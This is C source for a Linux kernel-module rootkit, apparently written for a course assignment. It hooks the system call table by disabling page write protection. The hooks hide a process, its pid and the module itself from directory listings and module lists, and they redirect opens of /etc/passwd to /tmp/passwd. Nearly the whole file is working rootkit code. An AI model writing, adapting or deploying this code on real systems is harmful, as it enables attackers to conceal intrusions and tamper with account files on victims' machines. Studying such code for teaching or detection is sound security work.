#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long *sys_call_table;

//linux_dirent structure
struct linux_dirent64{
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  unsigned char d_type;
  char d_name[0];
};
typedef struct linux_dirent64 sneaky_linux_dirent;

//get the “sneaky_process” pid
static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid");


// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_getdents64)(struct pt_regs* regs);
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *regs);

//new sneaky version of the 'getdents64' syscall
asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
  //a pointer pointing at the first block
  sneaky_linux_dirent* linux_ptr;
  
  //define the length of files' blocks in original directory and in sneaky version
  int res_len = original_getdents64(regs);
  //the original directory is empty
  if(res_len == 0){
    return 0;
  }

  linux_ptr = (sneaky_linux_dirent*)(regs->si);
  //printk(KERN_INFO "&&&sneaky pid is %s\n", pid);
  //find the "sneaky_process" file block
  //traverse all the blocks
  for(; ((char*)linux_ptr - (char*)(regs->si)) < res_len; linux_ptr=(sneaky_linux_dirent*)((char*)linux_ptr+linux_ptr->d_reclen)){
    if(strcmp(linux_ptr->d_name,"sneaky_process")==0||strcmp(linux_ptr->d_name,pid)==0||strcmp(linux_ptr->d_name,"sneaky_mod")==0){
      //int cur_len=linux_ptr->d_reclen;
      memmove((char*)linux_ptr, (char*)linux_ptr + linux_ptr->d_reclen, res_len - ((char*)linux_ptr + linux_ptr->d_reclen - (char*)(regs->si)));
      res_len -= linux_ptr->d_reclen;
      //return_byte_num-=this_block_bnum;
    }
  }
  return res_len;
}

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  if(strstr((char*)(regs->si), "/etc/passwd") != NULL){
    copy_to_user((void*)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
    return (*original_openat)(regs);
  }
  return (*original_openat)(regs);
}

//new sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  ssize_t origi_len = original_read(regs);
  char* buffer = (char*)(regs->si);
  char* find_snkymod = strstr(buffer, "sneaky_mod ");
  if(find_snkymod != NULL){
    char* fine_newline = strchr(find_snkymod,'\n');
    if(fine_newline != NULL) {
      memmove(find_snkymod, fine_newline + 1, (origi_len - (ssize_t)fine_newline + (ssize_t)buffer - 1));
      origi_len -= (ssize_t)(fine_newline - find_snkymod) + 1;
    }
  }
  return (ssize_t)origi_len;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_openat = (void *)sys_call_table[__NR_openat];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");